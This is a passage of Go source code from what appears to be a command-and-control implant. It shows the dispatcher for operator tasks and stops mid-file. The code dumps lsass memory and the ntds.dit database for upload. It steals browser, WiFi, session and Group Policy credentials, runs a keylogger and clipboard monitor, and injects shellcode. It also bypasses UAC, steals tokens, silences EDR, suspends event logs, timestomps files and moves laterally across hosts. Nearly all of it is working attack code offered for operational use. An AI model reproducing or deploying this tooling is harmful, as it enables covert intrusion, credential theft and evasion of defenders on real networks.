		if err := t.uploadFile(task.ID, "lsass.dmp", data); err != nil {
			t.sendResult(task.ID, "", "upload: "+err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("lsass dump uploaded (%d bytes)", len(data)), "")

	case "LSASS_DUMP_NT":
		// NtReadVirtualMemory-based lsass dump; builds MDMP without MiniDumpWriteDump.
		// Args: optional PID (0 = auto-find lsass.exe)
		var pid2 uint32
		if task.Args != "" {
			if p, err := strconv.ParseUint(strings.TrimSpace(task.Args), 10, 32); err == nil {
				pid2 = uint32(p)
			}
		}
		data2, err2 := lsassDumpNT(pid2)
		if err2 != nil {
			t.sendResult(task.ID, "", err2.Error())
			return
		}
		if err2 = t.uploadFile(task.ID, "lsass_nt.dmp", data2); err2 != nil {
			t.sendResult(task.ID, "", "upload: "+err2.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("lsass NT dump uploaded (%d bytes)", len(data2)), "")

	case "PORT_SCAN":
		// Args: "<target> [ports|method] [timeout_ms]"
		// Discovery methods: arp, icmp, tcp, auto (default: auto = ARP→ICMP→TCP)
		// If second arg is a method keyword → host-discovery with that method.
		// If second arg is port range → TCP port scan.
		// If ports omitted or "-" → host-discovery (auto method).
		parts := strings.Fields(task.Args)
		if len(parts) < 1 {
			t.sendResult(task.ID, "", "usage: PORT_SCAN <target> [ports|arp|icmp|tcp] [timeout_ms]")
			return
		}
		timeoutMs := 500
		portArg := ""
		method := "auto"

		discoverMethods := map[string]bool{"arp": true, "icmp": true, "tcp": true, "auto": true, "none": true}

		if len(parts) >= 2 {
			if discoverMethods[parts[1]] {
				method = parts[1]
				if method == "none" {
					method = "auto"
				}
			} else if parts[1] != "-" {
				portArg = parts[1]
			}
		}
		// parse timeout from remaining args
		for _, p := range parts[2:] {
			if ms, err := strconv.Atoi(p); err == nil {
				timeoutMs = ms
				break
			}
		}
		// if only two args and second is a number, treat as timeout
		if len(parts) == 2 && portArg != "" {
			if ms, err := strconv.Atoi(portArg); err == nil {
				portArg = ""
				timeoutMs = ms
			}
		}

		if portArg == "" {
			hosts := expandTargets(parts[0])
			out := hostDiscover(hosts, method, timeoutMs)
			t.sendResult(task.ID, out, "")
		} else {
			out := portScan(parts[0], portArg, timeoutMs)
			t.sendResult(task.ID, out, "")
		}

	case "INJECT_APC":
		// Early-bird APC injection. Args: process (optional). Payload: shellcode.
		sc, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode: "+err.Error())
			return
		}
		type apcRes struct{ out, errStr string }
		ch := make(chan apcRes, 1)
		go func() {
			defer func() {
				if r := recover(); r != nil {
					ch <- apcRes{"", fmt.Sprintf("panic: %v", r)}
				}
			}()
			o, e := forkRunAPC(sc, strings.TrimSpace(task.Args))
			es := ""
			if e != nil {
				es = e.Error()
			}
			ch <- apcRes{o, es}
		}()
		select {
		case r := <-ch:
			t.sendResult(task.ID, r.out, r.errStr)
		case <-time.After(10 * time.Second):
			t.sendResult(task.ID, "[+] APC queued (async)", "")
		}

	// ── Keylogger ─────────────────────────────────────────────────────────────

	case "KEYLOG_START":
		out, err := startKeylog()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "KEYLOG_STOP":
		out, err := stopKeylog()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "KEYLOG_DUMP":
		t.sendResult(task.ID, dumpKeylog(), "")

	case "CLIP_GET":
		out, err := getClipboard()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "CLIP_MONITOR_START":
		interval := 5
		if task.Args != "" {
			if n, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil && n > 0 {
				interval = n
			}
		}
		out, err := startClipMonitor(interval)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "CLIP_MONITOR_DUMP":
		t.sendResult(task.ID, dumpClipMonitor(), "")

	case "CLIP_MONITOR_STOP":
		t.sendResult(task.ID, stopClipMonitor(), "")

	// ── HTTP reverse-proxy pivot ──────────────────────────────────────────────

	// ── Reverse SOCKS5 ───────────────────────────────────────────────────────

	case "RSOCKS_START":
		port := strings.TrimSpace(task.Args)
		if port == "" {
			t.sendResult(task.ID, "", "usage: RSOCKS_START <callback_port>")
			return
		}
		if err := startRSocks(port); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, "[+] reverse SOCKS5 tunnel established (callback port "+port+")", "")

	case "RSOCKS_STOP":
		t.sendResult(task.ID, stopRSocks(), "")

	case "HTTP_PIVOT_START":
		port := 8888
		if task.Args != "" {
			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
				port = p
			} else {
				var pa struct {
					Port int `json:"port"`
				}
				if json.Unmarshal([]byte(task.Args), &pa) == nil && pa.Port > 0 {
					port = pa.Port
				}
			}
		}
		if err := startHTTPPivot(port); err != nil {
			t.sendResult(task.ID, "", "http pivot start failed: "+err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] HTTP pivot listening on :%d", port), "")

	case "HTTP_PIVOT_STOP":
		t.sendResult(task.ID, stopHTTPPivot(), "")

	case "TCP_PIVOT_START":
		port := 4444
		if task.Args != "" {
			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
				port = p
			} else {
				var pa struct {
					Port int `json:"port"`
				}
				if json.Unmarshal([]byte(task.Args), &pa) == nil && pa.Port > 0 {
					port = pa.Port
				}
			}
		}
		if err := startTCPPivot(port); err != nil {
			t.sendResult(task.ID, "", "tcp pivot start failed: "+err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] TCP pivot listening on :%d", port), "")

	case "TCP_PIVOT_STOP":
		port := 0
		if task.Args != "" {
			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
				port = p
			}
		}
		t.sendResult(task.ID, stopTCPPivot(port), "")

	// ── SMB named pipe pivot server ───────────────────────────────────────────

	case "PIPE_START":
		pipeName := strings.TrimSpace(task.Args)
		if err := startPipeServer(pipeName); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		pipe := pipeName
		if pipe == "" {
			pipe = `\\.\pipe\svcctl`
		}
		t.sendResult(task.ID, "[+] pipe server listening on "+pipe, "")

	case "PIPE_STOP":
		// Args: optional pipe name to stop; empty = stop all
		t.sendResult(task.ID, stopPipeServer(strings.TrimSpace(task.Args)), "")

	// ── WinRM lateral movement ────────────────────────────────────────────────

	case "WINRM_EXEC":
		// Args JSON: {"target":"host","user":"dom\\user","pass":"pwd","cmd":"whoami"}
		var wa struct {
			Target string `json:"target"`
			User   string `json:"user"`
			Pass   string `json:"pass"`
			Cmd    string `json:"cmd"`
		}
		if err := json.Unmarshal([]byte(task.Args), &wa); err != nil {
			t.sendResult(task.ID, "", "bad args: "+err.Error())
			return
		}
		out, err := winrmExec(wa.Target, wa.User, wa.Pass, wa.Cmd)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "WINRM_DEPLOY":
		// Args JSON: {"target":"host","user":"dom\\user","pass":"pwd","payload":"<PS one-liner>"}
		var wa struct {
			Target  string `json:"target"`
			User    string `json:"user"`
			Pass    string `json:"pass"`
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal([]byte(task.Args), &wa); err != nil {
			t.sendResult(task.ID, "", "bad args: "+err.Error())
			return
		}
		out, err := winrmDeploy(wa.Target, wa.User, wa.Pass, wa.Payload)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "ISHELL_OPEN":
		shell := strings.ToLower(strings.TrimSpace(task.Args))
		// The web UI sends {"shell":"cmd|ps"}; older clients sent the
		// shell name directly. Accept both wire formats.
		if strings.HasPrefix(shell, "{") {
			var openArgs struct {
				Shell string `json:"shell"`
			}
			if err := json.Unmarshal([]byte(task.Args), &openArgs); err == nil && openArgs.Shell != "" {
				shell = strings.ToLower(strings.TrimSpace(openArgs.Shell))
			}
		}
		if err := ishellOpen(shell); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, "[+] interactive shell active", "")

	case "ISHELL_RUN":
		cmdLine := task.Args
		// Keep accepting the former {"cmd":"..."} envelope as well as
		// the current raw command text (which also permits PowerShell blocks).
		if strings.HasPrefix(strings.TrimSpace(cmdLine), "{") {
			var runArgs struct {
				Cmd string `json:"cmd"`
			}
			if err := json.Unmarshal([]byte(cmdLine), &runArgs); err == nil && runArgs.Cmd != "" {
				cmdLine = runArgs.Cmd
			}
		}
		out, err := ishellRun(cmdLine)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "ISHELL_CLOSE":
		ishellClose()
		t.sendResult(task.ID, "[+] shell closed", "")

	case "KILL":
		t.sendResult(task.ID, "bye", "")
		os.Exit(0)

	// ── Token Store ───────────────────────────────────────────────────────────

	case "TOKEN_STORE_STEAL":
		pid, err := strconv.ParseUint(strings.TrimSpace(task.Args), 10, 32)
		if err != nil {
			t.sendResult(task.ID, "", "invalid pid: "+err.Error())
			return
		}
		id, user, err := tsStealAndAdd(uint32(pid))
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] token #%d stolen from PID %d (%s)", id, pid, user), "")

	case "TOKEN_STORE_SHOW":
		t.sendResult(task.ID, tsShowStore(), "")

	case "TOKEN_STORE_USE":
		id, err := strconv.Atoi(strings.TrimSpace(task.Args))
		if err != nil {
			t.sendResult(task.ID, "", "invalid id: "+err.Error())
			return
		}
		t.sendResult(task.ID, tsUseStore(id), "")

	case "TOKEN_STORE_REMOVE":
		id, err := strconv.Atoi(strings.TrimSpace(task.Args))
		if err != nil {
			t.sendResult(task.ID, "", "invalid id: "+err.Error())
			return
		}
		t.sendResult(task.ID, tsRemoveStore(id), "")

	case "TOKEN_STORE_CLEAR":
		t.sendResult(task.ID, tsClearStore(), "")

	// ── Screenwatch ───────────────────────────────────────────────────────────

	case "SCREENWATCH_START":
		intervalSec := 30
		if task.Args != "" {
			if n, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil && n > 0 {
				intervalSec = n
			}
		}
		startScreenWatchCmd(t, task.ID, intervalSec)
		t.sendResult(task.ID, fmt.Sprintf("[+] screenwatch started (interval %ds)", intervalSec), "")

	case "SCREENWATCH_STOP":
		t.sendResult(task.ID, stopScreenWatchCmd(), "")

	// ── BOF Store ────────────────────────────────────────────────────────────

	case "BOF_STORE_LOAD":
		name := strings.TrimSpace(task.Args)
		if name == "" {
			t.sendResult(task.ID, "", "usage: BOF_STORE_LOAD <name> (payload=base64 COFF)")
			return
		}
		if task.Payload == "" {
			t.sendResult(task.ID, "", "empty payload")
			return
		}
		data, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode: "+err.Error())
			return
		}
		bofDSLoad(name, data)
		t.sendResult(task.ID, fmt.Sprintf("[+] BOF '%s' loaded into store (%d bytes)", name, len(data)), "")

	case "BOF_STORE_LIST":
		t.sendResult(task.ID, bofDSList(), "")

	case "BOF_STORE_UNLOAD":
		name := strings.TrimSpace(task.Args)
		bofDSRemove(name)
		t.sendResult(task.ID, fmt.Sprintf("[+] BOF '%s' removed from store", name), "")

	// ── EDR Silencing (WFP firewall rule) ─────────────────────────────────────

	case "EDR_SILENCE":
		t.sendResult(task.ID, edrSilence(task.Args), "")

	case "EDR_SILENCE_RM":
		t.sendResult(task.ID, edrSilenceRemove(task.Args), "")

	// ── Event Log Suspension ──────────────────────────────────────────────────

	case "EVENTLOG_SUSPEND":
		t.sendResult(task.ID, eventlogSuspend(), "")

	case "EVENTLOG_RESUME":
		t.sendResult(task.ID, eventlogResume(), "")

	// ── UAC Bypass ───────────────────────────────────────────────────────────

	case "ELEVATE":
		// Args: "fodhelper <cmd>" | "computerdefaults <cmd>" | "cmlua <cmd>"
		parts := strings.SplitN(strings.TrimSpace(task.Args), " ", 2)
		method := ""
		cmd := ""
		if len(parts) >= 1 {
			method = strings.ToLower(parts[0])
		}
		if len(parts) >= 2 {
			cmd = parts[1]
		}
		var out string
		switch method {
		case "computerdefaults":
			out = uacComputerDefaults(cmd)
		case "cmlua":
			out = uacBypassCMLUA(cmd)
		default: // fodhelper
			out = uacFodHelper(cmd)
		}
		t.sendResult(task.ID, out, "")

	// ── Kerberos operations ───────────────────────────────────────────────────

	case "KERB_LIST":
		t.sendResult(task.ID, kerberosListTickets(), "")

	case "KERB_PTT":
		// Args JSON: {"ticket":"<base64-encoded .kirbi>"}
		var ka struct {
			Ticket string `json:"ticket"`
		}
		if err := json.Unmarshal([]byte(task.Args), &ka); err != nil {
			t.sendResult(task.ID, "", "bad KERB_PTT args: "+err.Error())
			return
		}
		if ka.Ticket == "" {
			t.sendResult(task.ID, "", "KERB_PTT: ticket field is empty")
			return
		}
		t.sendResult(task.ID, kerberosPassTheTicket(ka.Ticket), "")

	case "KERB_PURGE":
		t.sendResult(task.ID, kerberosPurge(), "")

	// ── Inline PE execution ───────────────────────────────────────────────────

	case "EXEC_PE":
		// Payload: base64-encoded raw PE bytes. Args (optional): command-line hint.
		if task.Payload == "" {
			t.sendResult(task.ID, "", "EXEC_PE: empty payload")
			return
		}
		pebytes, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "EXEC_PE: decode payload: "+err.Error())
			return
		}
		t.sendResult(task.ID, execPE(pebytes, task.Args), "")

	// ── PEB Masquerading ──────────────────────────────────────────────────────

	case "PEB_SPOOF":
		t.sendResult(task.ID, pebSpoof(strings.TrimSpace(task.Args)), "")

	// ── HWBP Clear ────────────────────────────────────────────────────────────

	case "HWBP_CLEAR":
		clearHardwareBreakpoints()
		t.sendResult(task.ID, "[+] hardware breakpoints cleared", "")

	// ── GPP Passwords (MS14-025) ─────────────────────────────────────────────

	case "GPP_PASSWORDS":
		creds, err := huntGPPPasswords()
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		data, _ := json.MarshalIndent(creds, "", "  ")
		t.sendResult(task.ID, string(data), "")

	// ── WiFi credentials ─────────────────────────────────────────────────────

	case "WIFI_CREDS":
		creds, err := stealWifiCreds()
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		if len(creds) == 0 {
			t.sendResult(task.ID, "[no saved WiFi profiles with keys found]", "")
			return
		}
		data, _ := json.MarshalIndent(creds, "", "  ")
		t.sendResult(task.ID, string(data), "")

	// ── SessionGopher — PuTTY / WinSCP / FileZilla / SuperPuTTY / RDP ────────

	case "SESSION_CREDS":
		creds, err := stealSessionCreds()
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		data, _ := json.MarshalIndent(creds, "", "  ")
		t.sendResult(task.ID, string(data), "")

	// ── Browser credentials + Windows Credential Manager ────────────────────

	case "BROWSER_CREDS":
		creds, err := stealBrowserCreds()
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		data, _ := json.MarshalIndent(creds, "", "  ")
		t.sendResult(task.ID, string(data), "")

	// ── File search ──────────────────────────────────────────────────────────
	// Args: "[root] <pattern>"   e.g. "*.kdbx"  or  "C:\Users *.pfx"

	case "SEARCH":
		parts := strings.Fields(task.Args)
		if len(parts) == 0 {
			t.sendResult(task.ID, "", "usage: search [root] <pattern>  — e.g. search *.kdbx")
			return
		}
		root, pattern := defaultSearchRoot(), parts[0]
		if len(parts) >= 2 {
			root = parts[0]
			pattern = parts[1]
		}
		results, err := fileSearch(root, pattern, 2000, 60*time.Second)
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, formatSearchResults(results, len(results) >= 2000), "")

	// ── Timestomping ─────────────────────────────────────────────────────────
	// Args: "<file> [YYYY-MM-DD|ref_file]"   ref_file defaults to kernel32.dll

	case "TIMESTOMP":
		parts := strings.SplitN(strings.TrimSpace(task.Args), " ", 2)
		if len(parts) == 0 || parts[0] == "" {
			t.sendResult(task.ID, "", "usage: timestomp <file> [YYYY-MM-DD|ref_file]")
			return
		}
		target := parts[0]
		ref := ""
		if len(parts) == 2 {
			ref = parts[1]
		}
		if err := timestompFile(target, ref); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] timestamps updated: %s", target), "")

	// ── Alternate Data Streams ────────────────────────────────────────────────
	// ADS_LIST  <file>
	// ADS_READ  <file>:<stream>
	// ADS_WRITE <file>:<stream>   (payload = base64 data)
	// ADS_DEL   <file>:<stream>

	case "ADS_LIST":
		path := strings.TrimSpace(task.Args)
		if path == "" {
			t.sendResult(task.ID, "", "usage: ads list <file>")
			return
		}
		out, err := adsList(path)
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, out, "")

	case "ADS_READ":
		arg := strings.TrimSpace(task.Args)
		idx := strings.LastIndex(arg, ":")
		if idx <= 0 {
			t.sendResult(task.ID, "", "usage: ads read <file>:<stream>")
			return
		}
		data, err := adsRead(arg[:idx], arg[idx+1:])
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, string(data), "")

	case "ADS_WRITE":
		arg := strings.TrimSpace(task.Args)
		idx := strings.LastIndex(arg, ":")
		if idx <= 0 || task.Payload == "" {
			t.sendResult(task.ID, "", "usage: ads write <file>:<stream>  (payload=base64 data)")
			return
		}
		raw, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode payload: "+err.Error())
			return
		}
		if err := adsWrite(arg[:idx], arg[idx+1:], raw); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] wrote %d bytes to %s", len(raw), arg), "")

	case "ADS_DEL":
		arg := strings.TrimSpace(task.Args)
		idx := strings.LastIndex(arg, ":")
		if idx <= 0 {
			t.sendResult(task.ID, "", "usage: ads del <file>:<stream>")
			return
		}
		if err := adsDelete(arg[:idx], arg[idx+1:]); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] deleted stream %s", arg), "")

	// ── ntds.dit dump via ntdsutil ────────────────────────────────────────────

	case "NTDS_DUMP":
		outDir := strings.TrimSpace(task.Args)
		if outDir == "" {
			outDir = `C:\Windows\Temp\ntdsutil_out`
		}
		cmd := fmt.Sprintf(`ntdsutil "ac i ntds" "ifm" "create full %s" q q`, outDir)
		out, err := runShell(cmd)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] ntds.dit dump to %s\n%s", outDir, out), errStr)

	case "DCSYNC":
		// Extract ntds.dit + SYSTEM hive via IFM (default) or VSS, upload both files.
		// Args JSON: {"mode":"ifm|vss","out":"C:\\Users\\Public\\dcsync_out"}
		// Offline parsing: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
		var dca struct {
			Mode string `json:"mode"`
			Out  string `json:"out"`
		}
		dca.Mode = "ifm"
		dca.Out = `C:\Users\Public\dcsync_out`
		json.Unmarshal([]byte(task.Args), &dca)
		tmpDir := dca.Out

		var dcErr string
		if dca.Mode == "vss" {
			// VSS shadow copy approach
			vssOut, _ := runShell(`vssadmin create shadow /for=C: 2>&1`)
			shadowPath := ""
			for _, line := range strings.Split(vssOut, "\n") {
				if strings.Contains(line, "HarddiskVolumeShadowCopy") && strings.Contains(line, "\\\\?\\") {
					parts := strings.Fields(strings.TrimSpace(line))
					if len(parts) > 0 {
						shadowPath = strings.Trim(parts[len(parts)-1], "\r")
						break
					}
				}
			}
			if shadowPath == "" {
				dcErr = "VSS shadow copy failed: " + vssOut
			} else {
				runShell(fmt.Sprintf(`mkdir "%s" 2>&1`, tmpDir))
				runShell(fmt.Sprintf(`copy "%s\\Windows\\NTDS\\ntds.dit" "%s\\ntds.dit" /Y 2>&1`, shadowPath, tmpDir))
				runShell(fmt.Sprintf(`copy "%s\\Windows\\System32\\config\\SYSTEM" "%s\\SYSTEM" /Y 2>&1`, shadowPath, tmpDir))
			}
		} else {
			// IFM: ntdsutil create full snapshot
			runShell(fmt.Sprintf(`rmdir /S /Q "%s" 2>&1`, tmpDir))
			ifmOut, _ := runShell(fmt.Sprintf(`ntdsutil "ac i ntds" "ifm" "create full %s" q q 2>&1`, tmpDir))
			_ = ifmOut
		}

		if dcErr == "" {
			ntdsPath := tmpDir + `\Active Directory\ntds.dit`
			sysPath := tmpDir + `\registry\SYSTEM`
			if dca.Mode == "vss" {
				ntdsPath = tmpDir + `\ntds.dit`
				sysPath = tmpDir + `\SYSTEM`
			}
			for _, fp := range [][2]string{{ntdsPath, "ntds.dit"}, {sysPath, "SYSTEM"}} {
				if data, err2 := os.ReadFile(fp[0]); err2 == nil {
					t.uploadFile(task.ID, fp[1], data)
				} else {
					dcErr += fmt.Sprintf("read %s: %v; ", fp[0], err2)
				}
			}
			runShell(fmt.Sprintf(`rmdir /S /Q "%s" 2>&1`, tmpDir))
			t.sendResult(task.ID, "[+] DCSYNC: ntds.dit + SYSTEM uploaded. Run: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL", dcErr)
		} else {
			t.sendResult(task.ID, "", dcErr)
		}

	// ── Lateral movement ──────────────────────────────────────────────────────
	// Args JSON: {"method":"psexec|wmi|winrm|ssh|dcom","host":"<ip>","payload":"<file>",
	//             "svcname":"<opt>","user":"<opt DOMAIN\\user>","pass":"<opt>"}

	case "JUMP", "LATERAL":
		var la struct {
			Method    string `json:"method"`
			Host      string `json:"host"`
			Payload   string `json:"payload"`
			SvcName   string `json:"svcname"`
			User      string `json:"user"`
			Pass      string `json:"pass"`
			LocalPath string `json:"local_path"` // skip disk write, reuse existing file
		}
		if err := json.Unmarshal([]byte(task.Args), &la); err != nil {
			t.sendResult(task.ID, "", "bad LATERAL args: "+err.Error())
			return
		}
		if la.Host == "" || (la.Payload == "" && la.LocalPath == "") {
			t.sendResult(task.ID, "", "LATERAL: host and payload (or local_path) are required")
			return
		}

		existingPath := la.LocalPath

		// "self" payload: reuse this agent's own executable on disk.
		// Defender has already cleared it (it's running), no new write needed.
		if strings.EqualFold(la.Payload, "self") {
			self, err2 := os.Executable()
			if err2 != nil {
				t.sendResult(task.ID, "", "LATERAL: resolve self: "+err2.Error())
				return
			}
			existingPath = self
		}

		var payloadBytes []byte
		if existingPath == "" {
			var err error
			if task.Payload != "" {
				payloadBytes, err = base64.StdEncoding.DecodeString(task.Payload)
				if err != nil {
					t.sendResult(task.ID, "", "LATERAL: decode inline payload: "+err.Error())
					return
				}
			} else {
				payloadBytes, err = t.downloadFile(la.Payload)
				if err != nil {
					t.sendResult(task.ID, "", "LATERAL: download '"+la.Payload+"': "+err.Error())
					return
				}
			}
			if len(payloadBytes) == 0 {
				t.sendResult(task.ID, "", "LATERAL: empty payload")
				return
			}
		}

		out, err := runLateral(la.Method, la.Host, payloadBytes, existingPath, la.SvcName, la.User, la.Pass)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	// ── Registry ──────────────────────────────────────────────────────────────

	case "REG_QUERY":
		var args struct {
			Path string `json:"path"`
			Name string `json:"name"`
		}
		if err := json.Unmarshal([]byte(task.Args), &args); err != nil {
			t.sendResult(task.ID, "", "bad REG_QUERY args: "+err.Error())
			return
		}
		out, err := regQuery(args.Path, args.Name)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "REG_SET":
		var args struct {
			Path  string `json:"path"`
			Name  string `json:"name"`
			Value string `json:"value"`
		}
		if err := json.Unmarshal([]byte(task.Args), &args); err != nil {
			t.sendResult(task.ID, "", "bad REG_SET args: "+err.Error())
			return
		}
		out, err := regSet(args.Path, args.Name, args.Value)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "REG_DELETE":
		var args struct {
			Path string `json:"path"`
			Name string `json:"name"`
		}
		if err := json.Unmarshal([]byte(task.Args), &args); err != nil {
			t.sendResult(task.ID, "", "bad REG_DELETE args: "+err.Error())
			return
		}
		out, err := regDelete(args.Path, args.Name)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "REG_LIST":
		var args struct {
			Path string `json:"path"`
		}
		if err := json.Unmarshal([]byte(task.Args), &args); err != nil {
			t.sendResult(task.ID, "", "bad REG_LIST args: "+err.Error())
			return
		}
		out, err := regList(args.Path)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	// ── SSH Command Execution ─────────────────────────────────────────────────

	case "SSH_EXEC":
		var args struct {
			Host string `json:"host"`
			Port int    `json:"port"`
			User string `json:"user"`
			Pass string `json:"pass"`
			Cmd  string `json:"cmd"`
		}
		if err := json.Unmarshal([]byte(task.Args), &args); err != nil {
			t.sendResult(task.ID, "", "bad SSH_EXEC args: "+err.Error())
			return
		}
		if args.Host == "" || args.User == "" || args.Cmd == "" {
			t.sendResult(task.ID, "", "SSH_EXEC: host, user, and cmd are required")
			return
		}
		out, err := sshExec(args.Host, args.Port, args.User, args.Pass, args.Cmd)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	// ── Parity aliases & stubs ───────────────────────────────────────────────

	case "PE_EXEC":
		if task.Payload == "" {
			t.sendResult(task.ID, "", "PE_EXEC: empty payload")
			return
		}
		pebytes, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "PE_EXEC: decode payload: "+err.Error())
			return
		}
		t.sendResult(task.ID, execPE(pebytes, task.Args), "")

	case "NETSTAT":
		out, err := runShell("netstat -ano")
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "NET_USE":
		var nu struct {
			Share string `json:"share"`
			User  string `json:"user"`
			Pass  string `json:"pass"`
		}
		json.Unmarshal([]byte(task.Args), &nu)
		out, _ := runShell(fmt.Sprintf(`net use "%s" "%s" /user:"%s" 2>&1`, nu.Share, nu.Pass, nu.User))
		t.sendResult(task.ID, out, "")

	case "NET_USE_DEL":
		out, _ := runShell(fmt.Sprintf(`net use "%s" /delete /yes 2>&1`, strings.TrimSpace(task.Args)))
		t.sendResult(task.ID, out, "")

	case "ADCS_REQUEST":
		var ar struct {
			CA       string `json:"ca"`
			Template string `json:"template"`
			Subject  string `json:"subject"`
			SAN      string `json:"san"`
			Out      string `json:"out"`
		}
		json.Unmarshal([]byte(task.Args), &ar)
		t.sendResult(task.ID, adcsRequest(ar.CA, ar.Template, ar.Subject, ar.SAN, ar.Out), "")

	case "WHOAMI":
		out, _ := runShell("whoami /all")
		t.sendResult(task.ID, out, "")

	case "IPCONFIG":
		out, _ := runShell("ipconfig /all")
		t.sendResult(task.ID, out, "")

	case "USERNAME", "USER":
		v := os.Getenv("USERNAME")
		if v == "" {
			v = os.Getenv("USER")
		}
		t.sendResult(task.ID, v, "")

	case "COMPUTERNAME":
		v := os.Getenv("COMPUTERNAME")
		if v == "" {
			v, _ = os.Hostname()
		}
		t.sendResult(task.ID, v, "")

	case "WIPE_MZ":
		wipePEHeaders()
		t.sendResult(task.ID, "[+] MZ header wiped", "")

	case "GPP_HUNT":
		creds, err := huntGPPPasswords()
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		data, _ := json.MarshalIndent(creds, "", "  ")
		t.sendResult(task.ID, string(data), "")

	case "CRED_WIFI":
		creds, err := stealWifiCreds()
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		if len(creds) == 0 {
			t.sendResult(task.ID, "[no saved WiFi profiles with keys found]", "")
			return
		}
		data, _ := json.MarshalIndent(creds, "", "  ")
		t.sendResult(task.ID, string(data), "")

	case "SESSION_GOPHER":
		creds, err := stealSessionCreds()
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		data, _ := json.MarshalIndent(creds, "", "  ")
		t.sendResult(task.ID, string(data), "")

	case "DETECTED":
		t.sendResult(task.ID, "[!] DETECTED flag acknowledged", "")

	case "HOME", "USERPROFILE":
		t.sendResult(task.ID, os.Getenv("USERPROFILE"), "")

	case "USERDOMAIN":
		t.sendResult(task.ID, os.Getenv("USERDOMAIN"), "")

	case "TEMP":
		v := os.Getenv("TEMP")
		if v == "" {
			v = os.Getenv("TMP")
		}
		t.sendResult(task.ID, v, "")

	case "DISPLAY":
		t.sendResult(task.ID, os.Getenv("DISPLAY"), "")

	default:
		t.sendResult(task.ID, "", "unknown task type: "+task.Type)
	}
}

func runShell(cmd string) (string, error) {
	if out, handled, err := runShellSystemHook(cmd); handled {
		return out, err
	}
	c := makeShellCmd(cmd)
	var out bytes.Buffer
	c.Stdout = &out
	c.Stderr = &out
	if err := c.Start(); err != nil {
		return "", err
	}
	done := make(chan error, 1)
	go func() { done <- c.Wait() }()
	select {
	case err := <-done:
		return out.String(), err
	case <-time.After(60 * time.Second):
		c.Process.Kill()
		return out.String(), fmt.Errorf("command timed out after 60s")
	}
}

// updateSleep is set by beacon.go at startup
var updateSleep func(sec, jitter int)

func parseSleepConfig() (int, int) {
	sec, err := strconv.Atoi(SleepSec)
	if err != nil {
		sec = 60
	}
	jitter, err := strconv.Atoi(JitterPct)
	if err != nil {
		jitter = 20
	}
	return sec, jitter
}

// ── Interactive shell ─────────────────────────────────────────────────────

type ishellSession struct {
	cmd   *exec.Cmd
	stdin io.WriteCloser
	outCh chan string
}

var (
